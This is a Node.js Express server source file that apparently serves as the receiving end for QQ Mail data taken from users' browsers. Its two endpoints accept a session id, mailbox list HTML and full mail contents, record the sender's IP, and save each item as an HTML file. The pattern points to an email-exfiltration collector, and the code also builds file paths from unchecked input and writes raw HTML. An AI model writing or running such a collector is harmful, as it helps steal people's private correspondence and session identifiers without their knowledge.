const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
// For solving "payload too large" error
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(cors());

// create /mails directory
const mailDir = path.join(__dirname, 'mails');
if (!fs.existsSync(mailDir)) {
    fs.mkdirSync(mailDir, { recursive: true });
}

// Get mail list
app.post('/QQmailList', (req, res) => {
    try {
        const mailEntry = {
            sid: req.body.sid,
            data: req.body.mailListData,
            timestamp: req.body.timestamp || new Date().toISOString(),
            ip: req.ip
        };
        console.log('Received:', mailEntry.sid);
        const htmlPath = path.join(mailDir, mailEntry.sid + '_mailList.html');
        const htmlContent = `
        <!DOCTYPE html>
        <html>
        <head>
        <title>Server Mail List</title>
        </head>
        <body>
        <h1>Server Mail List: ${mailEntry.timestamp}</h1>
        <h1>${mailEntry.ip}</h1>
        <h1>${mailEntry.sid}</h1>
        ${mailEntry.data}
        </body>
        </html>
        `;

        try {
            fs.writeFileSync(htmlPath, htmlContent);
            console.log('This mail list has been saved as HTML file in /mails.');
        } catch (e) {
            console.error('Failed to write file:', e);
        }

        res.status(200).json({ success: true });
    } catch (e) {
        console.error('Error:', e);
        res.status(500).json({ error: e.message });
    }
});

// Get mail content
app.post('/QQmailContent', (req, res) => {
    try {
        const mailEntry = {
            sid: req.body.sid,
            mid: req.body.mailId,
            // I am really confused why this "opacity: 0" style exists in the page...
            data: req.body.mailContentData.split('opacity: 0').join(''),
            timestamp: req.body.timestamp || new Date().toISOString(),
            ip: req.ip
        };

        const htmlPath = path.join(mailDir, mailEntry.sid + '_mailContent_' + mailEntry.mid + '.html');
        const htmlContent = `
        <!DOCTYPE html>
        <html>
        <head>
        <title>Server Mail Content</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        </head>
        <body>
        <h1>Server Mail Content: ${mailEntry.timestamp}</h1>
        <h1>${mailEntry.ip}</h1>
        <h1>${mailEntry.sid}</h1>
        <h1>${mailEntry.mid}</h1>
        ${mailEntry.data}
        </body>
        </html>
        `;

        try {
            fs.writeFileSync(htmlPath, htmlContent);
            console.log('+ The mail ' + mailEntry.mid + ' has been saved as HTML file in /mails.');
        } catch (e) {
            console.error('Failed to write file:', e);
        }

        res.status(200).json({ success: true });
    } catch (e) {
        console.error('Error:', e);
        res.status(500).json({ error: e.message });
    }
});

app.listen(4000, () => {
    console.log('The mail-server is running on: http://localhost:4000');
});
